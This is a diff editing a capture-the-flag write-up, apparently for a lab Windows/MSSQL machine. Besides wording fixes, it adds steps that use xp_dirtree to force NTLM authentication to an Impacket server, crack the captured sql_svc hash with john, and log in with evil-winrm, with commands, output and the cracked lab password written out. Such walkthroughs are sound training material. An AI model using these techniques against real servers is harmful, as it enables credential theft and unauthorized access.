@@ -343,13 +343,13 @@ SQL (PublicUser  guest@master)> xp_cmdshell whoami
 
 <br />
 
-Another technique we can leverage on the MSSQL Server is the `xp_dirtree` function.
+Another technique we can leverage on the MSSQL server is the `xp_dirtree` function.
 
 This function allows us to retrieve a `directory listing` from the file system.
 
 What's particularly interesting is that, if we point it to a network path hosted by an `Impacket server` running on our machine, we might be able to capture the `NTLM` hash of the user executing the query on the target system.
 
-So, first we will host the server using `impacket-server`:
+First, we host the server using `impacket-server`:
 
 <br />
 
@@ -367,7 +367,7 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 <br />
 
-Then, we run xp_dirtree targeting our server:
+Then, we run `xp_dirtree` targeting our server:
 
 <br />
 
@@ -379,7 +379,7 @@ subdirectory   depth   file
 
 <br />
 
-And check the impacket-server:
+And we check the impacket-server output:
 
 <br />
 
@@ -403,9 +403,9 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 
 <br />
 
-GG! We have a `NTLMv2` hash from the user `sql_svc`.
+Success! We have captured an `NTLMv2` hash from the user `sql_svc`.
 
-Let's try to crack it using `john`:
+Now, let's try to crack it using `john`:
 
 <br />
 
@@ -422,6 +422,59 @@ REGGIE1234ronnie (sql_svc)
 
 <br />
 
-We obtained new credentials: `sql_svc:REGGIE1234ronnie`
+We successfully cracked the hash and obtained valid credentials: `sql_svc:REGGIE1234ronnie`
+
+<br />
+
+### WinRM:
+
+With that credentials we use `evil-winrm` to gain access to the system:
+
+<br />
+
+```bash
+❯ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
+sequel\sql_svc
+```
+
+<br />
+
+# Privilege Escalation: sql_svc -> Ryan.Cooper
+
+<br />
+
+The `sql_svc` directory is empty.
+
+But there are many other users in the system:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users> dir
+
+
+    Directory: C:\Users
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----         2/7/2023   8:58 AM                Administrator
+d-r---        7/20/2021  12:23 PM                Public
+d-----         2/1/2023   6:37 PM                Ryan.Cooper
+d-----         2/7/2023   8:10 AM                sql_svc
+```
+
+<br />
+
+### ERRORLOG.BAK:
 
 <br />
